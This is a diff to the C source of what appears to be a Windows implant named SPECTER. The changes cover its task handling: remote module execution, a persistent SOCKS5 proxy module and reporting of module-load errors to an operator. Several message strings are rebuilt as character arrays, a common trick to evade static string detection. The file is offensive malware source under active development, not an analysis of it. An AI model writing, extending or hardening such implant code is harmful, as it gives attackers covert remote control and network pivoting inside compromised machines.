@@ -33,6 +33,10 @@ static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
                                    const char *text, DWORD text_len);
 static void store_task_failed_cstr(IMPLANT_CONTEXT *ctx, const char *task_id,
                                    const char *text);
+static void store_task_complete_cstr(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                     const char *text);
+static void store_task_failed_modmgr_code(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                          DWORD code);
 static DWORD task_b64_encode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max);
 
 #define SOCKS_INBOX_MAX_FRAMES 32u
@@ -754,7 +758,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
 
     if (slot < 0) {
         TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute failed");
-        store_task_failed_cstr(ctx, task->task_id, "module load failed before entrypoint");
+        store_task_failed_modmgr_code(ctx, task->task_id, modmgr_last_error());
         return;
     }
 
@@ -762,56 +766,9 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     if (persistent_socks) {
         mod->flags |= (MODULE_FLAG_PERSISTENT | MODULE_FLAG_SOCKS);
 
-        guardian_wait(mod, 250);
-
-        BYTE *output_buf = NULL;
-        DWORD drained = 0;
-        if (mod->output_ring) {
-            output_buf = (BYTE *)task_alloc(TASK_OUTPUT_MAX);
-            if (!output_buf) {
-                guardian_kill(mod);
-                modmgr_cleanup(mgr, (DWORD)slot);
-                store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
-                return;
-            }
-            drained = output_drain(mod->output_ring, output_buf, TASK_OUTPUT_MAX);
-        }
-
-        if (mod->status == MODULE_STATUS_CRASHED ||
-            mod->status == MODULE_STATUS_COMPLETED) {
-            if (drained > 0) {
-                BYTE *result_data = (BYTE *)task_alloc(drained);
-                if (result_data) {
-                    spec_memcpy(result_data, output_buf, drained);
-                    store_task_result(ctx, task->task_id, TASK_STATUS_FAILED,
-                                      result_data, drained);
-                } else {
-                    store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
-                }
-            } else {
-                store_task_failed_cstr(ctx, task->task_id,
-                                       "socks5 module exited during startup");
-            }
-            if (output_buf)
-                task_free(output_buf);
-            modmgr_cleanup(mgr, (DWORD)slot);
-            return;
-        }
-
-        if (drained > 0) {
-            BYTE *result_data = (BYTE *)task_alloc(drained);
-            if (result_data) {
-                spec_memcpy(result_data, output_buf, drained);
-                store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE,
-                                  result_data, drained);
-            } else {
-                store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
-            }
-        } else {
-            store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
-        }
-        if (output_buf)
-            task_free(output_buf);
+        char msg[] = {'s','o','c','k','s','5',' ','m','o','d','u','l','e',' ',
+                      'g','u','a','r','d','i','a','n',' ','l','a','u','n','c','h','e','d',0};
+        store_task_complete_cstr(ctx, task->task_id, msg);
         TASK_TRACE("[SPECTER] execute_module_task: socks persistent");
         return;
     }
@@ -897,6 +854,59 @@ static void store_task_failed_cstr(IMPLANT_CONTEXT *ctx, const char *task_id,
         return;
     }
     store_task_failed_text(ctx, task_id, text, spec_strlen(text));
+}
+
+static void store_task_complete_cstr(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                     const char *text) {
+    if (!text) {
+        store_task_result(ctx, task_id, TASK_STATUS_COMPLETE, NULL, 0);
+        return;
+    }
+
+    DWORD text_len = spec_strlen(text);
+    if (text_len == 0) {
+        store_task_result(ctx, task_id, TASK_STATUS_COMPLETE, NULL, 0);
+        return;
+    }
+
+    BYTE *buf = (BYTE *)task_alloc(text_len);
+    if (!buf) {
+        store_task_result(ctx, task_id, TASK_STATUS_COMPLETE, NULL, 0);
+        return;
+    }
+    spec_memcpy(buf, text, text_len);
+    store_task_result(ctx, task_id, TASK_STATUS_COMPLETE, buf, text_len);
+}
+
+static DWORD append_u32_dec(char *buf, DWORD pos, DWORD cap, DWORD val) {
+    char tmp[12];
+    DWORD n = 0;
+    if (val == 0) {
+        if (pos < cap) buf[pos++] = '0';
+        return pos;
+    }
+    while (val > 0 && n < sizeof(tmp)) {
+        tmp[n++] = (char)('0' + (val % 10));
+        val /= 10;
+    }
+    while (n > 0 && pos < cap)
+        buf[pos++] = tmp[--n];
+    return pos;
+}
+
+static void store_task_failed_modmgr_code(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                          DWORD code) {
+    char msg[64];
+    DWORD pos = 0;
+    char prefix[] = {
+        'm','o','d','u','l','e',' ','l','o','a','d',' ','f','a','i','l','e','d',' ',
+        'b','e','f','o','r','e',' ','e','n','t','r','y','p','o','i','n','t',' ',
+        'c','o','d','e','=',0
+    };
+    for (DWORD i = 0; prefix[i] && pos < sizeof(msg); i++)
+        msg[pos++] = prefix[i];
+    pos = append_u32_dec(msg, pos, sizeof(msg), code);
+    store_task_failed_text(ctx, task_id, msg, pos);
 }
 
 static BOOL task_b64_decode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max, DWORD *out_len) {
